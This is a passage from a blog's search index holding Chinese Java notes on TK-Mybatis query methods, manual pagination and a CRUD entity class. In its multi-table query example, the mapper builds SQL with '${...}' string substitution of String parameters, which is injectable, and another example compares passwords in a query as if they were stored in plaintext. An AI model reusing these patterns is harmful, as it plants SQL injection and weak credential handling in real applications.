punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>user<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                       <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                   <span class="token punctuation">}</span>               <span class="token punctuation">}</span>               <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>           <span class="token punctuation">}</span>       <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">collect</span><span class="token punctuation">(</span>Collectors<span class="token punctuation">.</span><span class="token function">toList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TK-Mybaties常用方法</title>
      <link href="/2021/10/11/tk.mybatis-chang-yong-fang-fa/"/>
      <url>/2021/10/11/tk.mybatis-chang-yong-fang-fa/</url>
      
        <content type="html"><![CDATA[<h1 id="TK-Mybatis常用方法"><a href="#TK-Mybatis常用方法" class="headerlink" title="TK-Mybatis常用方法"></a>TK-Mybatis常用方法</h1><p><img src="/images/tkmybatis-1.png" alt="andCondition"></p><p><code>andCondition</code> 是 TKMyBatis 提供的一种构造查询条件的方法。使用 <code>andCondition</code> 可以直接在查询条件中添加 SQL 片段，并且这个方法会自动在 SQL 片段前添加 <code>AND</code> 关键字。</p><h2 id="1-查全部"><a href="#1-查全部" class="headerlink" title="1.查全部"></a>1.查全部</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//查全部</span><span class="token keyword">public</span> List<span class="token operator">&lt;</span>SysUser<span class="token operator">></span> <span class="token function">getUserList</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span> sysUserMapper<span class="token punctuation">.</span><span class="token function">selectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="2-根据主键id查询"><a href="#2-根据主键id查询" class="headerlink" title="2.根据主键id查询"></a>2.根据主键id查询</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//根据主键id查询</span><span class="token keyword">public</span> SysUser <span class="token function">getUserById</span><span class="token punctuation">(</span>Long id<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">return</span>  sysUserMapper<span class="token punctuation">.</span><span class="token function">selectByPrimaryKey</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="3-根据主键id选择更新"><a href="#3-根据主键id选择更新" class="headerlink" title="3.根据主键id选择更新"></a>3.根据主键id选择更新</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//根据主键id选择更新    </span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span>SysUser user<span class="token punctuation">)</span> <span class="token punctuation">{</span>    sysUserMapper<span class="token punctuation">.</span><span class="token function">updateByPrimaryKeySelective</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="4-根据主键id更新所有"><a href="#4-根据主键id更新所有" class="headerlink" title="4.根据主键id更新所有"></a>4.根据主键id更新所有</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//根据主键id更新所有</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span>SysUser user<span class="token punctuation">)</span> <span class="token punctuation">{</span>    sysUserMapper<span class="token punctuation">.</span><span class="token function">updateByPrimaryKey</span><span class="token punctuation">(</span>user<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="5-根据主键id删除"><a href="#5-根据主键id删除" class="headerlink" title="5.根据主键id删除"></a>5.根据主键id删除</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//根据主键id删除</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span>Long id<span class="token punctuation">)</span> <span class="token punctuation">{</span>    sysUserMapper<span class="token punctuation">.</span><span class="token function">deleteByPrimaryKey</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="6-根据条件精确查询"><a href="#6-根据条件精确查询" class="headerlink" title="6.根据条件精确查询"></a>6.根据条件精确查询</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//根据条件精确查询    </span><span class="token keyword">public</span> List<span class="token operator">&lt;</span>SysUser<span class="token operator">></span> <span class="token function">getUserList</span><span class="token punctuation">(</span>String loginName<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>SysUser<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>loginName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"loginName"</span><span class="token punctuation">,</span> loginName<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> sysUserMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="7-根据条件模糊查询"><a href="#7-根据条件模糊查询" class="headerlink" title="7.根据条件模糊查询"></a>7.根据条件模糊查询</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//根据条件模糊查询    </span><span class="token keyword">public</span> List<span class="token operator">&lt;</span>SysUser<span class="token operator">></span> <span class="token function">getUserList</span><span class="token punctuation">(</span>String loginName<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>SysUser<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>loginName<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andLike</span><span class="token punctuation">(</span><span class="token string">"loginName"</span><span class="token punctuation">,</span> <span class="token string">"%"</span> <span class="token operator">+</span> loginName <span class="token operator">+</span> <span class="token string">"%"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> sysUserMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="8-根据时间查询并排序"><a href="#8-根据时间查询并排序" class="headerlink" title="8.根据时间查询并排序"></a>8.根据时间查询并排序</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//根据时间查询并排序    </span><span class="token keyword">public</span> List<span class="token operator">&lt;</span>SysUser<span class="token operator">></span> <span class="token function">getUserList</span><span class="token punctuation">(</span>String startDate<span class="token punctuation">,</span> String endDate<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>SysUser<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Example<span class="token punctuation">.</span>Criteria criteria <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>startDate<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        criteria<span class="token punctuation">.</span><span class="token function">andGreaterThanOrEqualTo</span><span class="token punctuation">(</span><span class="token string">"createTime"</span><span class="token punctuation">,</span> startDate<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>StringUtils<span class="token punctuation">.</span><span class="token function">isNotBlank</span><span class="token punctuation">(</span>endDate<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        criteria<span class="token punctuation">.</span><span class="token function">andLessThanOrEqualTo</span><span class="token punctuation">(</span><span class="token string">"createTime"</span><span class="token punctuation">,</span> endDate<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    example<span class="token punctuation">.</span><span class="token function">setOrderByClause</span><span class="token punctuation">(</span><span class="token string">"create_time desc"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> sysUserMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="9-根据条件选择更新"><a href="#9-根据条件选择更新" class="headerlink" title="9.根据条件选择更新"></a>9.根据条件选择更新</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//根据条件选择更新    </span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span>SysUser user<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>SysUser<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"loginName"</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getLoginName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sysUserMapper<span class="token punctuation">.</span><span class="token function">updateByExampleSelective</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> example<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="10-根据条件更新所有"><a href="#10-根据条件更新所有" class="headerlink" title="10.根据条件更新所有"></a>10.根据条件更新所有</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//根据条件更新所有    </span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">update</span><span class="token punctuation">(</span>SysUser user<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>SysUser<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"loginName"</span><span class="token punctuation">,</span> user<span class="token punctuation">.</span><span class="token function">getLoginName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    sysUserMapper<span class="token punctuation">.</span><span class="token function">updateByExample</span><span class="token punctuation">(</span>user<span class="token punctuation">,</span> example<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="11-根据条件删除"><a href="#11-根据条件删除" class="headerlink" title="11.根据条件删除"></a>11.根据条件删除</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//根据条件删除    </span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">delete</span><span class="token punctuation">(</span>String loginName<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>SysUser<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"loginName"</span><span class="token punctuation">,</span> loginName<span class="token punctuation">)</span><span class="token punctuation">;</span>    sysUserMapper<span class="token punctuation">.</span><span class="token function">deleteByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="12-复杂条件查询"><a href="#12-复杂条件查询" class="headerlink" title="12.复杂条件查询"></a>12.复杂条件查询</h2><pre class=" language-java"><code class="language-java"><span class="token comment" spellcheck="true">//复杂条件查询    </span><span class="token keyword">public</span> List<span class="token operator">&lt;</span>SysUser<span class="token operator">></span> <span class="token function">getUserList</span><span class="token punctuation">(</span>String loginName<span class="token punctuation">,</span> String password<span class="token punctuation">)</span> <span class="token punctuation">{</span>    Example example <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Example</span><span class="token punctuation">(</span>SysUser<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    Example<span class="token punctuation">.</span>Criteria criteria1 <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    criteria1<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"loginName"</span><span class="token punctuation">,</span> loginName<span class="token punctuation">)</span><span class="token punctuation">;</span>    criteria1<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>    Example<span class="token punctuation">.</span>Criteria criteria2 <span class="token operator">=</span> example<span class="token punctuation">.</span><span class="token function">createCriteria</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    criteria2<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"email"</span><span class="token punctuation">,</span> loginName<span class="token punctuation">)</span><span class="token punctuation">;</span>    criteria2<span class="token punctuation">.</span><span class="token function">andEqualTo</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>    example<span class="token punctuation">.</span><span class="token function">or</span><span class="token punctuation">(</span>criteria2<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> sysUserMapper<span class="token punctuation">.</span><span class="token function">selectByExample</span><span class="token punctuation">(</span>example<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h2 id="13-多表查询"><a href="#13-多表查询" class="headerlink" title="13.多表查询"></a>13.多表查询</h2><p>在mapper文件定义方法名和SQL语句，使用方法:注入对应mapper后，用xxxmapper.方法名。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>entity<span class="token punctuation">.</span>WarningRules<span class="token punctuation">;</span><span class="token keyword">import</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>model<span class="token punctuation">.</span>FindNamesBody<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>Param<span class="token punctuation">;</span><span class="token keyword">import</span> org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>ibatis<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>Select<span class="token punctuation">;</span><span class="token keyword">import</span> tk<span class="token punctuation">.</span>mybatis<span class="token punctuation">.</span>mapper<span class="token punctuation">.</span>common<span class="token punctuation">.</span>Mapper<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>List<span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">WarningRulesMapper</span> <span class="token keyword">extends</span> <span class="token class-name">Mapper</span><span class="token operator">&lt;</span>WarningRules<span class="token operator">></span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Select</span><span class="token punctuation">(</span><span class="token string">"SELECT YJGZ_Name rulesName FROM T_XYYJ_YJGZ WHERE YJGZ_YJLX_Code = '${statisticType}' AND YJGZ_YJWD_Code = '${statisticLatitude}'"</span><span class="token punctuation">)</span>    List<span class="token operator">&lt;</span>String<span class="token operator">></span> <span class="token function">selectRulesName</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"statisticType"</span><span class="token punctuation">)</span> String statisticType<span class="token punctuation">,</span> <span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"statisticLatitude"</span><span class="token punctuation">)</span> String statisticLatitude<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     *  预警统计任务，查询规则名称、预警类型名称、预警纬度名称     */</span>    <span class="token annotation punctuation">@Select</span><span class="token punctuation">(</span><span class="token string">"select a.YJGZ_Name as 'rulesName',b.YJLX_MC as 'warningTypeName',c.YJWD_MC as 'latitudeName' from T_XYYJ_YJGZ a INNER JOIN T_XYYJ_YJLX b on a.YJGZ_YJLX_Code=b.YJLX_BM INNER JOIN T_XYYJ_YJWD c on a.YJGZ_YJWD_Code=c.YJWD_BM where a.YJGZ_ID='${recordRulesId}'"</span><span class="token punctuation">)</span>    List<span class="token operator">&lt;</span>FindNamesBody<span class="token operator">></span> <span class="token function">findNames</span><span class="token punctuation">(</span><span class="token annotation punctuation">@Param</span><span class="token punctuation">(</span><span class="token string">"recordRulesId"</span><span class="token punctuation">)</span> <span class="token keyword">int</span> recordRulesId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre>]]></content>
      
      
      <categories>
          
          <category> TK.Mybatis </category>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TK.Mybatis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自定义分页</title>
      <link href="/2021/10/08/zi-ding-yi-fen-ye/"/>
      <url>/2021/10/08/zi-ding-yi-fen-ye/</url>
      
        <content type="html"><![CDATA[<h1 id="自定义分页"><a href="#自定义分页" class="headerlink" title="自定义分页"></a>自定义分页</h1><pre class=" language-java"><code class="language-java">    <span class="token keyword">public</span> TableDataInfo<span class="token operator">&lt;</span>CreditCardApply<span class="token operator">></span> <span class="token function">selectList</span><span class="token punctuation">(</span>CreditCardVo vo<span class="token punctuation">)</span>    <span class="token punctuation">{</span>        PageDomain pageDomain <span class="token operator">=</span> TableSupport<span class="token punctuation">.</span><span class="token function">buildPageRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//页码与分页大小</span>        <span class="token keyword">int</span> pageNum <span class="token operator">=</span> pageDomain<span class="token punctuation">.</span><span class="token function">getPageNum</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> pageSize <span class="token operator">=</span> pageDomain<span class="token punctuation">.</span><span class="token function">getPageSize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 对输入参数进行合法性校验</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>pageNum <span class="token operator">&lt;=</span> <span class="token number">0</span> <span class="token operator">||</span> pageSize <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">IllegalArgumentException</span><span class="token punctuation">(</span><span class="token string">"Invalid page number or page size"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        List<span class="token operator">&lt;</span>CreditCardApply<span class="token operator">></span> dataList <span class="token operator">=</span> service<span class="token punctuation">.</span><span class="token function">selectList</span><span class="token punctuation">(</span>vo<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> totalSize <span class="token operator">=</span> dataList<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> totalPages <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span> Math<span class="token punctuation">.</span><span class="token function">ceil</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">double</span><span class="token punctuation">)</span> totalSize <span class="token operator">/</span> pageSize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 修正页码，限制在合理范围内</span>        pageNum <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>pageNum<span class="token punctuation">,</span> totalPages<span class="token punctuation">)</span><span class="token punctuation">;</span>        pageNum <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">max</span><span class="token punctuation">(</span>pageNum<span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> startIndex <span class="token operator">=</span> <span class="token punctuation">(</span>pageNum <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> pageSize<span class="token punctuation">;</span>        <span class="token keyword">int</span> endIndex <span class="token operator">=</span> Math<span class="token punctuation">.</span><span class="token function">min</span><span class="token punctuation">(</span>startIndex <span class="token operator">+</span> pageSize<span class="token punctuation">,</span> totalSize<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 获取当前页的数据子集</span>        List<span class="token operator">&lt;</span>CreditCardApply<span class="token operator">></span> currentPageData <span class="token operator">=</span> dataList<span class="token punctuation">.</span><span class="token function">subList</span><span class="token punctuation">(</span>startIndex<span class="token punctuation">,</span> endIndex<span class="token punctuation">)</span><span class="token punctuation">;</span>        TableDataInfo<span class="token operator">&lt;</span>CreditCardApply<span class="token operator">></span> tableDataInfo <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TableDataInfo</span><span class="token operator">&lt;</span><span class="token operator">></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tableDataInfo<span class="token punctuation">.</span><span class="token function">setRows</span><span class="token punctuation">(</span>currentPageData<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//分页后的数据</span>        tableDataInfo<span class="token punctuation">.</span><span class="token function">setCode</span><span class="token punctuation">(</span>CommonMessage<span class="token punctuation">.</span>SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>        tableDataInfo<span class="token punctuation">.</span><span class="token function">setTotal</span><span class="token punctuation">(</span>totalSize<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//总数据条数</span>        tableDataInfo<span class="token punctuation">.</span><span class="token function">setMsg</span><span class="token punctuation">(</span><span class="token string">"操作成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        tableDataInfo<span class="token punctuation">.</span><span class="token function">setCurPage</span><span class="token punctuation">(</span>pageNum<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//页码</span>        tableDataInfo<span class="token punctuation">.</span><span class="token function">setTotalPage</span><span class="token punctuation">(</span>totalPages<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//分页总页数</span>        <span class="token keyword">return</span> tableDataInfo<span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><h1 id="超出页码返回最后一页"><a href="#超出页码返回最后一页" class="headerlink" title="超出页码返回最后一页"></a>超出页码返回最后一页</h1><pre class=" language-yml"><code class="language-yml">#超出页码返回最后一页pagehelper:  reasonable: true</code></pre>]]></content>
      
      
      <categories>
          
          <category> 随记 </category>
          
          <category> 分页 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 分页 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java增删改查</title>
      <link href="/2021/09/15/java-zeng-shan-gai-cha/"/>
      <url>/2021/09/15/java-zeng-shan-gai-cha/</url>
      
        <content type="html"><![CDATA[<h2 id="常规CRUD"><a href="#常规CRUD" class="headerlink" title="常规CRUD"></a>常规CRUD</h2><h3 id="实体类"><a href="#实体类" class="headerlink" title="实体类"></a>实体类</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>psds<span class="token punctuation">.</span>credit<span class="token punctuation">.</span>entity<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiModel<span class="token punctuation">;</span><span class="token keyword">import</span> io<span class="token punctuation">.</span>swagger<span class="token punctuation">.</span>annotations<span class="token punctuation">.</span>ApiModelProperty<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>Serializable<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>Date<span class="token punctuation">;</span><span class="token keyword">import</span> javax<span class="token punctuation">.</span>persistence<span class="token punctuation">.</span>*<span class="token punctuation">;</span><span class="token keyword">import</span> lombok<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * Table: T_XYYJ_YJLX * TableName: 信用预警——预警类型信息表 */</span><span class="token annotation punctuation">@Data</span><span class="token annotation punctuation">@ApiModel</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"信用预警——预警类型信息表"</span><span class="token punctuation">)</span><span class="token annotation punctuation">@Table</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"T_XYYJ_YJLX"</span><span class="token punctuation">)</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">WarningType</span> <span class="token keyword">implements</span> <span class="token class-name">Serializable</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/**     * 预警类型主键     */</span>    <span class="token annotation punctuation">@Id</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"YJLX_ID"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@GeneratedValue</span><span class="token punctuation">(</span>generator <span class="token operator">=</span> <span class="token string">"JDBC"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型主键"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Integer warningTypeId<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型编码     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"YJLX_BM"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型编码"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeCode<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型名称     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"YJLX_MC"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型名称"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeName<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 预警类型说明     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"YJLX_SM"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"预警类型说明"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> String warningTypeContext<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 创建时间     */</span>    <span class="token annotation punctuation">@Column</span><span class="token punctuation">(</span>name <span class="token operator">=</span> <span class="token string">"YJLX_Create_Time"</span><span class="token punctuation">)</span>    <span class="token annotation punctuation">@ApiModelProperty</span><span class="token punctuation">(</span>value<span class="token operator">=</span><span class="token string">"创建时间"</span><span class="token punctuation">)</span>    <span class="token keyword">private</span> Date createTime<span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * 创建用户编号     */</span>    <span class="token annotation 